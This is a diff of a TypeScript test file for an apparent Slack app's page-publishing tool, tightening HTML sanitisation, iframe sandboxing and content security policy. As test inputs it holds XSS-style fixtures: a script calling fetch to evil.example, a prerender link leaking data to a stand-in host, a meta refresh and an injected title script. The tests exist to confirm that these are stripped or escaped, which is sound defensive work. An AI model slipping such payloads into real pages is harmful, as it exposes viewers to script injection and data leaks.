@@ -29,7 +29,9 @@ const DAY = 24 * 60 * 60_000;
 const ORIGIN = "https://slack.phaseo.app";
 const CLIENT_ID = "1111111111.2222222222";
 const CLIENT_SECRET = "test-hosted-client-secret";
-const HTML = "<!doctype html><title>Spend</title><h1>October spend</h1><script>document.title += '!'</script>";
+const HTML = "<!doctype html><title>Spend</title><h1>October spend</h1>";
+/** HTML as publish_page stores it and the viewer serves it, cleaned (page-html.ts). */
+const CLEAN_HTML = "<!DOCTYPE html><html><head><title>Spend</title></head><body><h1>October spend</h1></body></html>";
 const URL_PATTERN = /^https:\/\/slack\.phaseo\.app\/p\/([0-9a-f]{64})\/([A-Za-z0-9_-]{22})$/;
 
 let world: TestWorld;
@@ -155,22 +157,32 @@ type Execute = (input: Record<string, unknown>) => Promise<Record<string, unknow
 const execute = (tool: { execute?: unknown }, input: Record<string, unknown>) => (tool.execute as Execute)(input);
 
 describe("publish_page", () => {
+	const published = vi.fn(async () => ({ status: "published" as const, id: "AAAAAAAAAAAAAAAAAAAAAA", expiresAt: NOW + 7 * DAY, answerPages: 1 }));
+	const linkTool = (overrides: Partial<Parameters<typeof publishPageTool>[0]> = {}) =>
+		publishPageTool({ modes: ["link"], defaultAccess: "link", expiryDays: 7, now: () => NOW, publish: published, url: (id) => `${ORIGIN}/p/key/${id}`, notes: [], searched: async () => false, ...overrides });
+
+	beforeEach(() => {
+		published.mockClear();
+	});
+
 	it("checks the title, the HTML and who can view it before publishing", async () => {
-		const publish = vi.fn(async () => ({ status: "published" as const, id: "AAAAAAAAAAAAAAAAAAAAAA", expiresAt: NOW + 7 * DAY, answerPages: 1 }));
 		const notes: string[] = [];
-		const tool = publishPageTool({ modes: ["link"], defaultAccess: "link", expiryDays: 7, now: () => NOW, publish, url: (id) => `${ORIGIN}/p/key/${id}`, notes });
+		const tool = linkTool({ notes });
 		expect(tool.id).toBe(PUBLISH_PAGE_TOOL_ID);
 		// One way to share: the model doesn't choose.
 		expect(Object.keys((tool.parameters as { properties: object }).properties)).toEqual(["title", "html"]);
 		expect(tool.description).toContain("kept for 7 days");
 		expect(tool.description).toContain("Who can view it: anyone with the link.");
-		expect(tool.description).toContain("Links don't open anything");
+		expect(tool.description).toContain("Publish a static web page");
+		expect(tool.description).toContain("A page has no scripts, links, forms or anything loaded from elsewhere");
+		expect(tool.description).toContain("write any URL out as text");
+		expect(tool.description).not.toContain("<script>");
 		await expect(execute(tool, { title: " ", html: HTML })).rejects.toThrow("title must not be empty");
 		await expect(execute(tool, { title: "x".repeat(121), html: HTML })).rejects.toThrow("at most 120 characters");
 		await expect(execute(tool, { title: "Spend", html: "" })).rejects.toThrow("html must not be empty");
 		await expect(execute(tool, { title: "Spend", html: "é".repeat(MAX_PAGE_BYTES / 2 + 1) })).rejects.toThrow("a page may be at most 512 KB");
 		await expect(execute(tool, { title: "Spend", html: HTML, access: "workspace" })).rejects.toThrow("access must be one of: link");
-		expect(publish).not.toHaveBeenCalled();
+		expect(published).not.toHaveBeenCalled();
 
 		await expect(execute(tool, { title: "  October\n spend ", html: HTML })).resolves.toEqual({
 			url: `${ORIGIN}/p/key/AAAAAAAAAAAAAAAAAAAAAA`,
@@ -179,13 +191,49 @@ describe("publish_page", () => {
 			expires_on: "2026-10-28",
 			pages_left_in_answer: MAX_PAGES_PER_ANSWER - 1,
 		});
-		expect(publish).toHaveBeenCalledWith({ title: "October spend", html: HTML, access: "link", expiresAt: NOW + 7 * DAY });
+		// Stored cleaned.
+		expect(published).toHaveBeenCalledWith({ title: "October spend", html: CLEAN_HTML, access: "link", expiresAt: NOW + 7 * DAY });
 		// Working memory gets the tool's name only.
 		expect(notes).toEqual(["publish_page"]);
 	});
 
+	it("stores the page without its scripts, links and remote content, and tells the model what was taken out", async () => {
+		const html = `<!doctype html><html><head><title>Spend</title><link rel="prerender" href="https://secret.evil.example/?t=spend"><meta http-equiv="refresh" content="0;url=https://evil.example/"></head>
+<body><h1 onclick="alert(1)">October spend</h1><a href="https://secret.evil.example/">Details</a><img src="https://evil.example/i.png"><script>fetch("https://evil.example")</script>
+<svg viewBox="0 0 10 10"><script>x()</script><rect width="5" height="5" fill="#0069a8"/></svg></body></html>`;
+		const result = await execute(linkTool(), { title: "Spend", html });
+		expect(result).toMatchObject({
+			url: `${ORIGIN}/p/key/AAAAAAAAAAAAAAAAAAAAAA`,
+			removed: ["<img>", "<link>", "<meta>", "<script>", "href", "onclick", "src"],
+			note: expect.stringContaining("A page can't have scripts, links, forms or anything loaded from elsewhere"),
+		});
+		const stored = (published.mock.calls[0] as unknown as [{ html: string }])[0].html;
+		expect(stored).toBe('<!DOCTYPE html><html><head><title>Spend</title></head>\n<body><h1>October spend</h1><a>Details</a>\n<svg viewBox="0 0 10 10"><rect width="5" height="5" fill="#0069a8"></rect></svg></body></html>');
+		// Nothing was taken out of an ordinary page, so nothing is said.
+		expect(await execute(linkTool(), { title: "Spend", html: HTML })).not.toHaveProperty("removed");
+	});
+
+	it("refuses a page with nothing left to show once it is cleaned", async () => {
+		await expect(execute(linkTool(), { title: "Spend", html: "<script>document.write('<h1>Spend</h1>')</script>" })).rejects.toThrow("the page has nothing left to show");
+		await expect(execute(linkTool(), { title: "Spend", html: `${"<div>".repeat(300)}deep` })).rejects.toThrow("nested too deeply");
+		expect(published).not.toHaveBeenCalled();
+	});
+
+	it("publishes nothing once the answer has searched Slack, after checking its input", async () => {
+		const notes: string[] = [];
+		const tool = linkTool({ notes, searched: async () => true });
+		// Input errors first, as for any tool.
+		await expect(execute(tool, { title: " ", html: HTML })).rejects.toThrow("title must not be empty");
+		await expect(execute(tool, { title: "Spend", html: HTML })).resolves.toEqual({
+			published: false,
+			note: "Nothing was saved: you searched Slack in this answer, and Slack's terms don't allow keeping anything its search finds, so nothing can be saved in it. Say so.",
+		});
+		expect(published).not.toHaveBeenCalled();
+		expect(notes).toEqual([]);
+	});
+
 	it("explains the limits to the model", async () => {
-		const tool = (status: "answer_limit" | "full") => publishPageTool({ modes: ["link"], defaultAccess: "link", expiryDays: 30, now: () => NOW, publish: async () => ({ status }), url: (id) => id, notes: [] });
+		const tool = (status: "answer_limit" | "full") => linkTool({ expiryDays: 30, publish: async () => ({ status }), url: (id) => id });
 		await expect(execute(tool("answer_limit"), { title: "Spend", html: HTML })).rejects.toThrow("published 3 pages in this answer");
 		await expect(execute(tool("full"), { title: "Spend", html: HTML })).rejects.toThrow("already keeps 200 pages");
 	});
@@ -193,7 +241,7 @@ describe("publish_page", () => {
 	describe("offered to a turn", () => {
 		const turn = { eventId: "Ev0TURN0001", slackUserId: "U0PERSON01" };
 		const offered = async (overrides: Partial<Installation> = {}, external = false) =>
-			turnPageTools(world.deps, { ...turn, external }, await installationRow(overrides), []);
+			turnPageTools(world.deps, { ...turn, external }, await installationRow(overrides), [], async () => false);
 		const access = (tools: Awaited<ReturnType<typeof offered>>) => (tools[0].parameters as { properties: { access?: { enum: string[] } } }).properties.access?.enum ?? null;
 
 		it("with links only, until Sign in with Slack is set up for the app", async () => {
@@ -236,7 +284,13 @@ describe("publish_page", () => {
 			const [, key, id] = String(result.url).match(URL_PATTERN) ?? [];
 			expect(key).toBe(storeKey());
 			expect(result.expires_on).toBe("2027-01-19");
-			expect(await store().page(id, NOW)).toMatchObject({ title: "October spend", access: "link", createdBy: "U0PERSON01", expiresAt: NOW + 90 * DAY, html: HTML });
+			expect(await store().page(id, NOW)).toMatchObject({ title: "October spend", access: "link", createdBy: "U0PERSON01", expiresAt: NOW + 90 * DAY, html: CLEAN_HTML });
+		});
+
+		it("asks whether the answer has searched Slack before storing anything", async () => {
+			const [tool] = await turnPageTools(world.deps, { ...turn, external: false }, await installationRow(), [], async () => true);
+			expect(await execute(tool, { title: "October spend", html: HTML })).toMatchObject({ published: false });
+			expect(storageOf(store()).count("pages")).toBe(0);
 		});
 	});
 });
@@ -256,7 +310,7 @@ describe("serving a page", () => {
 		expect(response.status).toBe(200);
 		expect(Object.fromEntries(response.headers)).toMatchObject({
 			"content-type": "text/html; charset=utf-8",
-			"content-security-policy": "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors 'none'; base-uri 'none'",
+			"content-security-policy": "default-src 'none'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; child-src 'none'; form-action 'none'; frame-ancestors 'none'; base-uri 'none'",
 			"x-content-type-options": "nosniff",
 			"referrer-policy": "no-referrer",
 			"cache-control": "private, no-store",
@@ -264,12 +318,13 @@ describe("serving a page", () => {
 			"x-robots-tag": "noindex, nofollow, noarchive",
 		});
 		const { outer, srcdoc } = await framed(response);
-		expect(srcdoc).toBe(HTML);
-		// The page's markup is only ever the frame's srcdoc, and the frame may run scripts and nothing else.
+		expect(srcdoc).toBe(CLEAN_HTML);
+		// The page's markup is only ever the frame's srcdoc, and the frame allows nothing: no scripts.
 		expect(outer).not.toContain("<h1>");
 		expect(outer).not.toContain("<script");
-		expect(outer.match(/<iframe [^>]*>/g)).toEqual([`<iframe sandbox="allow-scripts" title="October spend" srcdoc="${outer.match(/ srcdoc="([^"]*)"/)![1]}">`]);
-		expect(PAGE_SANDBOX).toBe("allow-scripts");
+		expect(outer.match(/<iframe [^>]*>/g)).toEqual([`<iframe sandbox="" title="October spend" srcdoc="${outer.match(/ srcdoc="([^"]*)"/)![1]}">`]);
+		expect(PAGE_SANDBOX).toBe("");
+		expect(PAGE_CSP).not.toContain("script-src");
 		expect(PAGE_CSP).not.toContain("sandbox");
 		expect(outer).toContain("<title>October spend</title>");
 		expect(response.headers.get("set-cookie")).toBeNull();
@@ -281,11 +336,24 @@ describe("serving a page", () => {
 		const title = `</title><script>alert(1)</script> "quoted" & 'single'`;
 		const id = await published({ html, title });
 		const { outer, srcdoc } = await framed(await request(`/p/${storeKey()}/${id}`));
-		expect(srcdoc).toBe(html);
+		expect(srcdoc).toBe("<!DOCTYPE html><html><head><title>x</title></head><body>\"&gt;\" '</body></html>");
 		expect(outer).not.toContain("<script");
 		expect(outer.match(/<iframe /g)).toHaveLength(1);
 		expect(outer.match(/<\/iframe>/g)).toHaveLength(1);
 		expect(outer).toContain("<title>&#60;/title&#62;&#60;script&#62;alert(1)&#60;/script&#62; &#34;quoted&#34; &#38; &#39;single&#39;</title>");
+	});
+
+	it("cleans a page again before serving it, whatever stored it", async () => {
+		// Stored straight into the store, as no publish_page would.
+		const id = await published({ html: `<h1>Spend</h1><link rel="prerender" href="https://secret.evil.example/"><a href="https://secret.evil.example/">More</a><script>x()</script>` });
+		const { srcdoc } = await framed(await request(`/p/${storeKey()}/${id}`));
+		expect(srcdoc).toBe("<!DOCTYPE html><html><head></head><body><h1>Spend</h1><a>More</a></body></html>");
+		// One with nothing left to show isn't served, and counts no view.
+		const empty = await published({ eventId: "Ev0PAGE0002", html: "<script>document.write('<h1>Spend</h1>')</script>" });
+		const response = await request(`/p/${storeKey()}/${empty}`);
+		expect(response.status).toBe(410);
+		expect(await response.text()).toContain("This page can&#39;t be shown any more.");
+		expect((await store().list(NOW)).find((page) => page.id === empty)?.views).toBe(0);
 	});
 
 	it("is not found: unknown, malformed, expired or deleted pages, and stores this namespace never made", async () => {
@@ -400,7 +468,7 @@ describe("Sign in with Slack for workspace pages", () => {
 		const cookie = session.split(";")[0];
 		const page = await request(`/p/${storeKey()}/${id}`, { cookie });
 		expect(page.status).toBe(200);
-		expect((await framed(page)).srcdoc).toBe(HTML);
+		expect((await framed(page)).srcdoc).toBe(CLEAN_HTML);
 		// The sign-in's users.info answer is fresh: no new call, no new cookie.
 		expect(world.slack.of("users.info")).toHaveLength(1);
 		expect(page.headers.get("set-cookie")).toBeNull();
@@ -621,6 +689,7 @@ describe("in an answer", () => {
 			return `Here it is: [Our October spend](${url})`;
 		});
 		expect(requests[0].tools.map((tool) => tool.id)).toContain("publish_page");
+		expect(requests[0].instructions).toContain("A page is static HTML and CSS (text, tables and charts drawn with inline SVG), with no scripts or links, so write any URL on it as text.");
 		const [, , id] = url.match(URL_PATTERN) ?? [];
 		expect(await store().page(id, NOW)).toMatchObject({ createdBy: "U0PERSON01", title: "Our October spend" });
 		const stored = JSON.stringify(step.outputs);
@@ -633,5 +702,6 @@ describe("in an answer", () => {
 	it("isn't offered to someone from another organisation", async () => {
 		const { requests } = await answerWith(async () => "No page.", true);
 		expect(requests[0].tools.map((tool) => tool.id)).not.toContain("publish_page");
+		expect(requests[0].instructions).not.toContain("publish_page");
 	});
 });
